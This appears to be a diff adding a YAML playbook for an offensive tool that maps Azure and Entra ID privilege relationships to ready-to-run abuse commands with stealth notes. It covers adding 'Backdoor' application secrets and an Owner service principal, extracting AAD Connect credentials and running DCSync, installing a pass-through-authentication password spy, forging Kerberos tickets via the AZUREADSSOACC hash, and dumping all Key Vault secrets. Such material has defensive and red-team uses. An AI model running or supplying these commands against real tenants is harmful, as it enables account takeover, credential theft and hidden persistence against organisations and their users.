@@ -1,0 +1,299 @@
+# Azure/Entra ID Abuse Commands
+# Attacks: Azure AD, Graph API, Hybrid Identity
+
+AZAddMembers:
+  description: "Can add members to Azure AD group"
+  commands:
+    - name: "Add member to group (Azure CLI)"
+      tool: az
+      command: |
+        az ad group member add --group '<GROUP_ID>' --member-id '<USER_ID>'
+    - name: "Add member to group (PowerShell)"
+      tool: AzureAD
+      command: |
+        Add-AzureADGroupMember -ObjectId '<GROUP_ID>' -RefObjectId '<USER_ID>'
+    - name: "Add member via Graph API"
+      tool: curl
+      command: |
+        curl -X POST 'https://graph.microsoft.com/v1.0/groups/<GROUP_ID>/members/$ref' \
+          -H 'Authorization: Bearer <TOKEN>' \
+          -H 'Content-Type: application/json' \
+          -d '{"@odata.id": "https://graph.microsoft.com/v1.0/users/<USER_ID>"}'
+  opsec:
+    - "Group membership changes logged in Azure AD audit logs"
+    - "Conditional access policies may apply to group"
+
+AZAddOwner:
+  description: "Can add owners to Azure AD object"
+  commands:
+    - name: "Add owner to application"
+      tool: az
+      command: |
+        az ad app owner add --id '<APP_ID>' --owner-object-id '<USER_ID>'
+    - name: "Add owner to service principal"
+      tool: az
+      command: |
+        az ad sp owner add --id '<SP_ID>' --owner-object-id '<USER_ID>'
+  opsec:
+    - "Owner additions logged in audit logs"
+    - "Owners can modify application credentials"
+
+AZAddSecret:
+  description: "Can add secrets/credentials to Azure AD application"
+  commands:
+    - name: "Add password credential to application"
+      tool: az
+      command: |
+        az ad app credential reset --id '<APP_ID>' --append
+    - name: "Add certificate credential"
+      tool: az
+      command: |
+        az ad app credential reset --id '<APP_ID>' --cert '<CERT_FILE>' --append
+    - name: "Add secret via Graph API"
+      tool: curl
+      command: |
+        curl -X POST 'https://graph.microsoft.com/v1.0/applications/<APP_ID>/addPassword' \
+          -H 'Authorization: Bearer <TOKEN>' \
+          -H 'Content-Type: application/json' \
+          -d '{"passwordCredential": {"displayName": "Backdoor"}}'
+  opsec:
+    - "Credential additions logged in audit logs"
+    - "Check for Conditional Access blocking service principal auth"
+
+AZGlobalAdmin:
+  description: "Azure AD Global Administrator - full control"
+  commands:
+    - name: "List all users"
+      tool: az
+      command: |
+        az ad user list --output table
+    - name: "Reset any user password"
+      tool: az
+      command: |
+        az ad user update --id '<USER_ID>' --password '<NEW_PASSWORD>'
+    - name: "Add credentials to any application"
+      tool: az
+      command: |
+        az ad app credential reset --id '<APP_ID>'
+    - name: "Escalate to on-premises via AAD Connect"
+      tool: note
+      command: |
+        # If AAD Connect exists, Global Admin can:
+        # 1. Reset AAD Connect sync account password
+        # 2. Add new sync account
+        # 3. Abuse Seamless SSO (AZUREADSSOACC)
+  opsec:
+    - "Global Admin actions logged in Azure AD audit logs"
+    - "Consider using less privileged roles when possible"
+
+AZPrivilegedRoleAdmin:
+  description: "Can assign Azure AD roles to users"
+  commands:
+    - name: "Assign Global Admin role"
+      tool: az
+      command: |
+        az role assignment create --assignee '<USER_ID>' --role 'Global Administrator'
+    - name: "List role assignments"
+      tool: az
+      command: |
+        az role assignment list --assignee '<USER_ID>'
+  opsec:
+    - "Role assignments logged in audit logs"
+    - "PIM may require justification for role activation"
+
+AZMGAddMember:
+  description: "MS Graph - Add member to group"
+  commands:
+    - name: "Add member via Graph API"
+      tool: curl
+      command: |
+        curl -X POST 'https://graph.microsoft.com/v1.0/groups/<GROUP_ID>/members/$ref' \
+          -H 'Authorization: Bearer <TOKEN>' \
+          -H 'Content-Type: application/json' \
+          -d '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/<USER_ID>"}'
+  opsec:
+    - "Graph API calls logged"
+    - "Check application permissions vs delegated permissions"
+
+AZMGAddOwner:
+  description: "MS Graph - Add owner to object"
+  commands:
+    - name: "Add owner via Graph API"
+      tool: curl
+      command: |
+        curl -X POST 'https://graph.microsoft.com/v1.0/applications/<APP_ID>/owners/$ref' \
+          -H 'Authorization: Bearer <TOKEN>' \
+          -H 'Content-Type: application/json' \
+          -d '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/<USER_ID>"}'
+  opsec:
+    - "Owner changes logged in audit logs"
+
+AZMGAddSecret:
+  description: "MS Graph - Add secret to application"
+  commands:
+    - name: "Add password credential"
+      tool: curl
+      command: |
+        curl -X POST 'https://graph.microsoft.com/v1.0/applications/<APP_ID>/addPassword' \
+          -H 'Authorization: Bearer <TOKEN>' \
+          -H 'Content-Type: application/json' \
+          -d '{"passwordCredential": {"displayName": "API Access", "endDateTime": "2099-12-31T00:00:00Z"}}'
+  opsec:
+    - "Secret additions logged"
+    - "Long expiry dates are suspicious"
+
+SyncedToEntraUser:
+  description: "On-prem user synced to Entra ID - compromise can affect both"
+  commands:
+    - name: "If you own the on-prem account"
+      tool: note
+      command: |
+        # On-prem password hash syncs to Azure AD
+        # Credential theft works for both environments
+        # Check for password writeback (reverse sync)
+    - name: "Check sync status"
+      tool: az
+      command: |
+        az ad user show --id '<USER_ID>' --query onPremisesSyncEnabled
+  opsec:
+    - "Synced users have onPremisesSyncEnabled=true"
+    - "Password changes may sync both ways"
+
+AADConnect:
+  description: "Azure AD Connect server - bridges on-prem and cloud"
+  commands:
+    - name: "Extract AAD Connect credentials"
+      tool: AADInternals
+      command: |
+        # On AAD Connect server:
+        Get-AADIntSyncCredentials
+    - name: "DCSync using AAD Connect account"
+      tool: Impacket
+      command: |
+        secretsdump.py '<DOMAIN>/MSOL_<ID>:<PASSWORD>'@<DC_IP>
+    - name: "Pass-through authentication abuse"
+      tool: AADInternals
+      command: |
+        Install-AADIntPTASpy
+        Get-AADIntPTASpyLog
+    - name: "Seamless SSO (AZUREADSSOACC) abuse"
+      tool: Mimikatz
+      command: |
+        # Extract AZUREADSSOACC computer account hash
+        lsadump::dcsync /user:AZUREADSSOACC$
+        # Forge Kerberos tickets for cloud auth
+  opsec:
+    - "AAD Connect has DCSync rights by default"
+    - "MSOL account password stored on AAD Connect server"
+    - "PTA abuse requires AAD Connect server access"
+
+AZVMContributor:
+  description: "Azure VM Contributor - can run commands on VMs"
+  commands:
+    - name: "Run command on VM"
+      tool: az
+      command: |
+        az vm run-command invoke -g '<RESOURCE_GROUP>' -n '<VM_NAME>' --command-id RunShellScript --scripts 'whoami && id'
+    - name: "Run PowerShell on Windows VM"
+      tool: az
+      command: |
+        az vm run-command invoke -g '<RESOURCE_GROUP>' -n '<VM_NAME>' --command-id RunPowerShellScript --scripts 'whoami; net user'
+  opsec:
+    - "Run command execution logged in Azure Activity Log"
+    - "Commands execute as SYSTEM/root"
+
+AZKeyVaultReader:
+  description: "Can read Key Vault secrets"
+  commands:
+    - name: "List secrets"
+      tool: az
+      command: |
+        az keyvault secret list --vault-name '<VAULT_NAME>'
+    - name: "Get secret value"
+      tool: az
+      command: |
+        az keyvault secret show --vault-name '<VAULT_NAME>' --name '<SECRET_NAME>'
+    - name: "Get all secrets"
+      tool: bash
+      command: |
+        for secret in $(az keyvault secret list --vault-name '<VAULT_NAME>' --query '[].name' -o tsv); do
+          echo "=== $secret ===" && az keyvault secret show --vault-name '<VAULT_NAME>' --name "$secret" --query value -o tsv
+        done
+  opsec:
+    - "Key Vault access logged in diagnostic logs"
+    - "Check for soft-delete and purge protection"
+
+AZContributor:
+  description: "Azure Contributor role - can manage resources but not access/security"
+  commands:
+    - name: "List resources you can manage"
+      tool: az
+      command: |
+        az resource list --query "[].{name:name, type:type}" -o table
+    - name: "Deploy ARM template (potential code execution)"
+      tool: az
+      command: |
+        az deployment group create --resource-group '<RG_NAME>' --template-file template.json
+  opsec:
+    - "Resource modifications logged in Activity Log"
+    - "Cannot modify IAM directly but can deploy resources"
+
+AZResetPassword:
+  description: "Can reset Azure AD user passwords"
+  commands:
+    - name: "Reset user password"
+      tool: az
+      command: |
+        az ad user update --id '<USER_ID>' --password '<NEW_PASSWORD>' --force-change-password-next-sign-in false
+    - name: "Reset password via Graph API"
+      tool: curl
+      command: |
+        curl -X PATCH 'https://graph.microsoft.com/v1.0/users/<USER_ID>' \
+          -H 'Authorization: Bearer <TOKEN>' \
+          -H 'Content-Type: application/json' \
+          -d '{"passwordProfile": {"password": "<NEW_PASSWORD>", "forceChangePasswordNextSignIn": false}}'
+  opsec:
+    - "Password reset logged in Azure AD audit logs"
+    - "User may notice password change"
+
+AZUserAccessAdministrator:
+  description: "Can manage user access to Azure resources"
+  commands:
+    - name: "Assign Owner role to yourself"
+      tool: az
+      command: |
+        az role assignment create --assignee '<YOUR_USER_ID>' --role 'Owner' --scope '/subscriptions/<SUB_ID>'
+    - name: "List current role assignments"
+      tool: az
+      command: |
+        az role assignment list --scope '/subscriptions/<SUB_ID>' -o table
+    - name: "Assign Contributor role"
+      tool: az
+      command: |
+        az role assignment create --assignee '<USER_ID>' --role 'Contributor' --scope '/subscriptions/<SUB_ID>'
+  opsec:
+    - "Role assignments logged in Activity Log"
+    - "Can escalate to full subscription Owner"
+
+AZOwner:
+  description: "Azure Owner role - full control over resources including IAM"
+  commands:
+    - name: "Assign any role to any user"
+      tool: az
+      command: |
+        az role assignment create --assignee '<USER_ID>' --role 'Owner' --scope '/subscriptions/<SUB_ID>'
+    - name: "Create service principal with credentials"
+      tool: az
+      command: |
+        az ad sp create-for-rbac --name "BackdoorSP" --role Owner --scopes '/subscriptions/<SUB_ID>'
+    - name: "Access all resources"
+      tool: az
+      command: |
+        az resource list -o table
+    - name: "Deploy to any resource"
+      tool: az
+      command: |
+        az vm run-command invoke -g '<RG_NAME>' -n '<VM_NAME>' --command-id RunShellScript --scripts 'whoami'
+  opsec:
+    - "Full control - all actions logged in Activity Log"
+    - "Consider using more targeted roles for stealth"
